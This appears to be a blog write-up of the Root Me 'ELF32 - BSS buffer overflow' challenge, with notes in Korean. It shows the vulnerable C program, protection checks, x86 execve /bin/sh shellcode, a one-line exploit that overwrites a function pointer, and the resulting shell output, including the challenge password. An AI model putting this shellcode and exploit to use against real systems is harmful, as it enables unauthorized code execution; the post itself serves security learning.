---
layout: post
title: "[root-me][app-system] ELF32 - BSS buffer overflow"
date: 2016-09-16 22:30:00
category: wargame
tags:  [root-me, bof]
---

Who said overflows happen only on the stack ?

[Challenges/App - System : ELF32 - BSS buffer overflow [Root Me : Hacking and Information Security learning platform]](https://www.root-me.org/en/Challenges/App-System/ELF32-BSS-buffer-overflow)

<!--more--> 

## Code

- 전역변수 `username[512]`
- `argv[1]` 을 `username[]` 에 복사
- `void (*_atexit)(int)` function pointer 를 변조해야 하나 ?

```c
#include <stdio.h>
#include <stdlib.h>
 
char username[512] = {1};
void (*_atexit)(int) =  exit;
 
void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0; 
}
 
int main(int argc, char **argv)
{
  if(argc != 2)
    {
      printf("[-] Usage : %s <username>\n", argv[0]);
      exit(0);
    }
 
  cp_username(username, argv[1]);
  printf("[+] Running program with username : %s\n", username);
 
  _atexit(0);
  return 0;
}

```

## Info

ASLR 없으며, `NX disabled` 라서 stack/data shellcode 실행 가능함.


```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./ch7

ASLR is OFF
```

`username[512]` 뒤에 `_atexit` 존재


```
0804a020  w      .data  00000000              data_start
0804a040 g     O .data  00000200              username
0804a240 g     O .data  00000004              _atexit
```

shellcode (23 bytes)

[Linux/x86 - execve /bin/sh shellcode - 23 bytes](http://shell-storm.org/shellcode/files/shellcode-827.php)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

## Payload


```
username[512]  = shaellcode + NOP
_atexit        = [username 주소]
```


## Exploit

```bash
$ ./ch7 $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*489 + "\x40\xa0\x04\x08"')
[+] Running program with username : 1Ph//shh/binS̀@

sh-4.2$ id
uid=1107(app-systeme-ch7) gid=1107(app-systeme-ch7) euid=1207(app-systeme-ch7-cracked) groups=1207(app-systeme-ch7-cracked),100(users),1107(app-systeme-ch7)

sh-4.2$ cat .passwd
aod8r2f!q:;oe
```

